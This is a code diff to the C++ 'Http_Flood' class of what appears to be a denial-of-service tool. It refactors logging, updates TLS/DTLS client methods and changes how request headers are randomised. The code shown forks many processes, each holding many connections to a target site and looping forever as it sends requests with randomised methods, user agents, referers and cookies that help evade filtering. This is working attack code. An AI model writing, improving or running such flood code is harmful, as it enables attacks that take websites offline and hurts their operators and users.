@@ -6,6 +6,7 @@
 
 #include "../Headers/Http_Flood.hpp"
 #include "../Headers/httphdr.hpp"
+#include "../Headers/Logging.hpp"
 
 
 Http_Flood::Http_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){
@@ -16,9 +17,9 @@ void Http_Flood::run() {
     for (int x = 0; x < conf->THREADS; x++) {
         if(fork()){
             if(conf->UseSSL){
-                attack_ssl(&x);
+                attack_ssl();
             }else{
-                attack(&x);
+                attack();
             }
         }
     }
@@ -28,14 +29,13 @@ void Http_Flood::run() {
 int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
     struct addrinfo hints{}, *servinfo, *p;
     int sock = 0, r;
-    std::string message = std::string("Connecting-> ") + host + ":" + port;
-    conf->logger->Log(&message, Logger::Info);
     bzero(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = sock_type;
     if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
-        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
-        conf->logger->Log(&message, Logger::Error);
+        char message[512];
+        snprintf(message, sizeof(message), "Getaddrinfo-> %s", gai_strerror(r));
+        print_error(message);
         exit(EXIT_FAILURE);
     }
     for(p = servinfo; p != nullptr; p = p->ai_next) {
@@ -52,14 +52,12 @@ int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
         if(servinfo){
             freeaddrinfo(servinfo);
         }
-        conf->logger->Log("No connection could be made", Logger::Error);
+        print_error("No connection could be made");
         exit(EXIT_FAILURE);
     }
     if(servinfo){
         freeaddrinfo(servinfo);
     }
-    message = std::string("Connected-> ") + host + ":" + port;
-    conf->logger->Log(&message, Logger::Info);
     return sock;
 }
 
@@ -69,7 +67,7 @@ SSL_CTX *Http_Flood::InitCTX() {
     SSL_CTX *ctx;
     ctx = SSL_CTX_new(method);
     if (ctx == nullptr){
-        conf->logger->Log("Unable to connect using ssl", Logger::Error);
+        print_error("Unable to connect using ssl");
         exit(EXIT_FAILURE);
     }
     return ctx;
@@ -79,7 +77,7 @@ SSL *Http_Flood::Apply_SSL(int socket, SSL_CTX *ctx) {
     SSL *ssl = SSL_new(ctx);
     SSL_set_fd(ssl, socket);
     if(SSL_connect(ssl) == -1){
-        conf->logger->Log("Unable to connect using ssl", Logger::Error);
+        print_error("Unable to connect using ssl");
         exit(EXIT_FAILURE);
     }
     return ssl;
@@ -117,7 +115,7 @@ int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
     return (SSL_write(ssl, string, length));
 }
 
-void Http_Flood::attack(const int *id) {
+void Http_Flood::attack() {
     int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
@@ -125,34 +123,28 @@ void Http_Flood::attack(const int *id) {
         sockets.emplace_back(0);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }
             httphdr header{};
             init_header(&header);
-            if((r = write_socket(sockets[x], header.get().c_str(), header.length())) == -1){
+            if((r = write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                conf->voly++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
 
-void Http_Flood::attack_ssl(const int *id) {
+void Http_Flood::attack_ssl() {
     int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
@@ -166,7 +158,6 @@ void Http_Flood::attack_ssl(const int *id) {
         CTXs.emplace_back(nullptr);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
@@ -184,15 +175,10 @@ void Http_Flood::attack_ssl(const int *id) {
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                conf->voly++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
@@ -200,10 +186,10 @@ void Http_Flood::attack_ssl(const int *id) {
 const SSL_METHOD *Http_Flood::GetMethod() {
     switch (conf->protocol){
         case Config::TCP:
-            return TLSv1_1_client_method();
+            return TLS_client_method();
         case Config::UDP:
 #ifdef DTLS_ANY_VERSION
-            return DTLSv1_2_client_method();
+            return DTLS_client_method();
 #else
             conf->logger->Log("Unable to find DTLS", Logger::Info);
             exit(EXIT_FAILURE);
@@ -220,18 +206,19 @@ void Http_Flood::init_header(httphdr *header) {
             Randomizer::randomstr((std::string&)*header);
             break;
         case Config::HTTP:{
-            header->method = Randomizer::random_method();
+             Randomizer::random_method(header->method);
             if(conf->RandomizeHeader){
-                Randomizer::randomstr(header->location);
+                Randomizer::randomstr(header->path);
             }
-            header->useragent = Randomizer::random_useragent(*(conf->useragents));
-            header->cache_control = Randomizer::random_caching();
-            header->encoding = Randomizer::random_encoding();
-            header->charset = {Randomizer::random_charset(), Randomizer::random_charset()};
-            header->referer = Randomizer::random_referer();
+            Randomizer::random_useragent(*(conf->useragents), header->useragent);
+            Randomizer::random_caching(header->cache_control);
+            Randomizer::random_encoding(header->encoding);
+            Randomizer::random_charset(header->charset[0]);
+            Randomizer::random_charset(header->charset[1]);
+            Randomizer::random_referer(header->referer);
             header->accept = "*/*";
             header->connection_type = "Keep-Alive";
-            header->content_type = Randomizer::random_contenttype();
+            Randomizer::random_contenttype(header->content_type);
             Randomizer::randomstr(header->cookie[0]);
             Randomizer::randomstr(header->cookie[1]);
             header->keep_alive = Randomizer::randomInt(1, 5000);
